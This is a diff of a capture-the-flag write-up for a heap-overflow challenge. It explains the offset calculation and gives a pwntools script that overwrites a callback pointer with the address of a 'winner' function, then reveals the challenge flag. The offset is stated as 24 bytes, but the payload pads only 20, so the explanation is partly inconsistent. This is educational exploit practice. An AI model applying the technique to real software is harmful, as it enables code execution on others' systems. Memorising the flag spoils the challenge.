@@ -95,5 +95,48 @@ second one, same, the strut with label __i2__ was initiated to the heap and foll
 ### 3. The Idea of Exploiting
 We know that there is `if (i2->callback) i2->callback()` this function pointer will call the whatever function inside the function pointer, but as we know the value of `callback` is NULL. We have to change it into `winner` address, so how we do it? yup, __Heap Overflow__, it so much alike with __Buffer Overflow__ the difference only where it was exploited.
 
-## 4. Create the exploit
-Because we already know what should we do, that is change the `i2->callback` value into winner address with __Heap Overflow__ so here we go, we should know the payload from our __input__ (i1->name) to our __target__ (i2->callback)
+### 4. Create the exploit
+Because we already know what should we do, that is change the `i2->callback` value into winner address with __Heap Overflow__ so here we go, we should know the payload from our __input__ (i1->name) to our __target__ (i2->callback).<br>
+
+## Find the offset
+Actually there is a fast method, but because the chunk isn't much, so I calculate it manually.<br>
+    i1->name heap: 8 byte<br>
+    i2 metadata  : 8 byte<br>
+    i2->priority : 4 byte
+    i2->name     : 4 byte
+so total of byte is 24, that's the offset. But there is one problem, i2-> name was holding an heap address as well, meanwhile, there is also<br>
+`strcpy(i2->name, argv[2])` mean we will write a text inside the heap of i2-> name, so we can't put random address or it could make a crash, the solution find the address that has `w` argument, it mean writeable, so everything will fine, I take the random heap number actually. but we can take an example from the hint number 2 like in `cylabacademy.org`
+<details>
+ <summary>HINT NO.2</summary>
+
+ <br>
+ `objdump -R can help to locate dynamic symbols like puts.`
+</details>
+you can also use `puts` address to fill the i2->name and follow up with `winner` address, so here's the payload.<br>
+
+## Create the exploit
+```python
+from pwn import *
+
+elf = context.binary = ELF('./vuln')
+io = remote('foggy-cliff.picoctf.net', 60047)
+
+
+winner_address = 0x080492b6
+puts_address = 0x0804c038
+
+payload = b"A" * 20 + p32(puts_address) + p32(winner_address) + b" A"
+
+log.info('SENDING THE PAYLOAD')
+io.sendline(payload)
+io.clean()
+print(io.recvall().decode())
+```
+
+Here's the flag
+<details>
+    <summary>THE FLAG</summary>
+
+    <br>
+    FLAG: picoCTF{h34p_0v3rfl0w_7bb56fe9}
+</details>
